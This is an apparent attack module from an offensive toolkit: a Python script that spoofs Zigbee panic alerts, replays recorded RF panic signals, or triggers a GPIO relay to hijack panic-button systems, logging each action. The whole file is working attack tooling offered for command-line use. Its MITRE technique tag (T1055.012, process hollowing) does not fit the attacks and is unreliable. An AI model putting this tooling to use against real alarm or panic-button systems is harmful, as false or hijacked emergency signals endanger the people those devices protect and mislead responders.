#!/usr/bin/env python3
# modules/attacks/panic_button_hijack.py

import os
import time
import json
import argparse
from datetime import datetime
from subprocess import run

LOG_FILE = "results/panic_button_hijack_log.json"
MITRE_TTP = "T1055.012"

def log_event(method, detail):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "detail": detail,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def spoof_zigbee_alert(interface, device_id):
    print(f"[+] Spoofing Zigbee panic alert to device {device_id}")
    run(["zbstumbler", "-i", interface, "-t", device_id, "-a", "panic_alert"])
    log_event("Zigbee Spoof", device_id)

def rf_signal_replay(signal_file):
    print(f"[+] Replaying RF panic signal from {signal_file}")
    run(["rf-replay", "--file", signal_file])
    log_event("RF Replay", signal_file)

def relay_trigger(relay_gpio):
    print(f"[+] Triggering GPIO relay on pin {relay_gpio}")
    run(["gpio", "write", str(relay_gpio), "1"])
    time.sleep(1)
    run(["gpio", "write", str(relay_gpio), "0"])
    log_event("Relay Pulse", f"GPIO {relay_gpio}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof or hijack panic button signals")
    parser.add_argument("--method", choices=["zigbee", "rf", "relay"], required=True)
    parser.add_argument("--target", required=True, help="Interface/device/file or GPIO pin")
    args = parser.parse_args()

    if args.method == "zigbee":
        spoof_zigbee_alert("zb0", args.target)
    elif args.method == "rf":
        rf_signal_replay(args.target)
    else:
        relay_trigger(args.target)
